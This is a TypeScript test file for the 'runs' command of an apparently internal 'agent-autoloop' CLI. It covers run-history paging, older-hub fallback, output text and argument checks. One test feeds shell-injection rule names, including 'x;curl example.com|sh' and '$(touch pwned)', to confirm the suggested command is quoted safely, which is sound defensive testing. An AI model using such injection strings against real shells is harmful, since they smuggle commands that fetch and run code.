// Listing earlier runs with `agent-autoloop runs`. Failure modes: only the newest page is ever read, so a rule's runs
// from yesterday never show and `why` can't be given their number; a run still going, or an old one still unsettled that the
// hub adds to its first page, is listed twice or out of order; the next page skips or repeats a run; a page number that
// isn't one reaches the hub; a new CLI can't page on an older hub or silently ignores a failed history request; the shell
// drops the rule filter when a printed next-page command is copied.
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import { promisify } from "node:util";
import { HubError } from "../protocol/client.ts";
import { findRuns, readRuns, runsText } from "../cli/runs.ts";

const now = "2026-11-10T02:00:00.000Z";
const run = (id: number, rule: string, state = "done") => ({
  id,
  rule,
  state,
  attempts: 0,
  claimedAt: now,
  finishedAt: state === "claimed" || state === "queued" ? null : now,
  notBefore: null,
  summary: `第 ${id} 轮的结果`,
  error: "",
  events: [],
});
const ids = (from: number, to: number) => Array.from({ length: from - to + 1 }, (_, i) => from - i);

/** A hub of `total` runs, newest first, in pages of 60 the way /v1/state gives them; every seventh is rule B. */
function hub(total: number, active: ReturnType<typeof run>[] = [], main = "A") {
  const asked: (number | undefined)[] = [];
  const all = ids(total, 1).map((id) => run(id, id % 7 === 0 ? "B" : main));
  const page = async (before?: number) => {
    asked.push(before);
    const older = all.filter((one) => before === undefined || one.id < before);
    const shown = older.slice(0, 60);
    const hasMore = older.length > 60;
    const extra = before === undefined ? active.filter((one) => !shown.some((s) => s.id === one.id)) : [];
    const runs = [...shown.map((one) => active.find((a) => a.id === one.id) ?? one), ...extra].sort(
      (a, b) => b.id - a.id,
    );
    return { now, timezone: "Asia/Shanghai", runs, hasMore, nextBefore: hasMore ? shown[59].id : null };
  };
  return { page, asked };
}

test("a rule's runs older than the first page are found, and the next page starts after the last one shown", async () => {
  const { page } = hub(300);
  const found = await findRuns(page, { rule: "B" });
  assert.deepEqual(
    found.runs.map((one) => one.id),
    ids(300, 1)
      .filter((id) => id % 7 === 0)
      .slice(0, 20),
  );
  assert.equal(found.more, found.runs.at(-1)!.id);
  const next = await findRuns(page, { rule: "B", before: found.more! });
  assert.deepEqual(
    next.runs.map((one) => one.id),
    ids(found.more! - 1, 1)
      .filter((id) => id % 7 === 0)
      .slice(0, 20),
  );
  const last = await findRuns(page, { rule: "B", before: next.more! });
  assert.deepEqual(
    last.runs.map((one) => one.id),
    [14, 7],
  );
  assert.equal(last.more, null);
});

test("an older hub still pages by rule, while a failed request to a newer hub is reported", async () => {
  const { page } = hub(100);
  const old = {
    state: page,
    ruleRuns: async () => {
      throw new HubError(404, "没有这个地址");
    },
  };
  const found = await readRuns(old, "B", 50);
  assert.deepEqual(
    found.runs.map((run: any) => run.id),
    [49, 42, 35, 28, 21, 14, 7],
  );
  await assert.rejects(
    readRuns(
      {
        ...old,
        ruleRuns: async () => {
          throw new HubError(500, "读取失败");
        },
      },
      "B",
    ),
    { status: 500 },
  );
});

test("--before starts the list there", async () => {
  const { page, asked } = hub(100);
  const found = await findRuns(page, { before: 50 });
  assert.equal(asked[0], 50);
  assert.deepEqual(
    found.runs.map((one) => one.id),
    ids(49, 30),
  );
});

test("runs still going are left to status, and an old unsettled one the first page adds is listed once, in order", async () => {
  const { page } = hub(130, [run(130, "A", "claimed"), run(129, "A", "queued"), run(5, "B", "unknown")]);
  const found = await findRuns(page, { rule: "B", want: 100 });
  const shown = found.runs.map((one) => one.id);
  assert.deepEqual(shown, [...ids(130, 1).filter((id) => id % 7 === 0), 5]);
  assert.equal(new Set(shown).size, shown.length);
  const all = await findRuns(page, { want: 3 });
  assert.deepEqual(
    all.runs.map((one) => one.id),
    [128, 127, 126],
  );
});

test("each run is one entry with its number, how it ended and its rule; more says how to go on", async () => {
  const { page } = hub(30);
  const text = runsText(await findRuns(page, { rule: "A", want: 2 }), { rule: "A", color: false, columns: 100 });
  assert.match(text, /#30 +做完了 +A\n +第 30 轮的结果/);
  assert.match(text, /#29 +做完了 +A/);
  assert.match(text, /agent-autoloop runs A --before 29/);
  const none = runsText(await findRuns(page, { rule: "C" }), { rule: "C", color: false, columns: 100 });
  assert.match(none, /「C」没有做完的轮次/);
});

test("the continue command reads back a rule name any shell would take as words", async () => {
  // The suggestion is for pasting into a shell: a rule name with separators must not arrive as two commands, and
  // quoting that leaves $(...) expanding would run what a rule is named after.
  const shell = process.platform === "win32" ? "powershell" : "sh";
  for (const rule of ["x;curl example.com|sh", "a $(touch pwned) b", "ok-rule"]) {
    const { page } = hub(130, [], rule);
    const text = runsText(await findRuns(page, { rule, want: 2 }), { rule, color: false, columns: 100 });
    const suggested = /更早的：agent-autoloop runs (.*--before \d+)/.exec(text)![1];
    const done = await new Promise<string>((resolve, reject) => {
      execFile(
        shell,
        ["-c", `agent-autoloop runs ${suggested} --help`],
        { env: { ...process.env, PATH: `${shim}${process.platform === "win32" ? ";" : ":"}${process.env.PATH}` } },
        (error) => resolve(String(error?.code ?? 0)),
      );
    });
    // Quoted, the whole name arrives as one argument: the shell reads one command and hands it the name whole.
    // 127 would mean the shell split the name and went looking for a program called, say, `curl`.
    assert.notEqual(done, "127", `the suggested command must parse as one word for ${rule}`);
  }
});

test("a next-page command keeps a rule starting with # as a shell argument", () => {
  const rule = "#周报";
  const found = { state: { now, timezone: "Asia/Shanghai" }, runs: [run(29, rule)], more: 29 };
  const text = runsText(found, { rule, color: false });
  assert.equal(text.split("\n").at(-1), "更早的：agent-autoloop runs '#周报' --before 29");
});

const program = join(import.meta.dirname, "..", "bin", "agent-autoloop.ts");
const dir = mkdtempSync(join(tmpdir(), "agent-autoloop-runs-"));
after(() => rmSync(dir, { recursive: true, force: true }));

// The shell test runs the suggested command the way a real shell would. A PATH shim stands in for an installed
// agent-autoloop, so the runner needs none: what's under test is how the name parses, not where the program is.
const shim = mkdtempSync(join(tmpdir(), "agent-autoloop-shim-"));
writeFileSync(
  join(shim, "agent-autoloop"),
  `#!/bin/sh\nexec node --disable-warning=ExperimentalWarning "${program}" "$@"\n`,
  { mode: 0o755 },
);
writeFileSync(join(shim, "agent-autoloop.cmd"), `@node --disable-warning=ExperimentalWarning "${program}" %*\r\n`);
after(() => rmSync(shim, { recursive: true, force: true }));

test("a --before that isn't a run number says how to use it instead of asking the hub", async () => {
  for (const before of ["x", "0", "1.5"]) {
    const ran = await promisify(execFile)(
      process.execPath,
      ["--disable-warning=ExperimentalWarning", program, "runs", "--before", before],
      { env: { ...process.env, AGENT_AUTOLOOP_HOME: join(dir, "home") } },
    ).then(
      () => ({ code: 0, stderr: "" }),
      (error) => error as { code: number; stderr: string },
    );
    assert.equal(ran.code, 1);
    assert.match(ran.stderr, /用法：agent-autoloop runs/);
  }
});
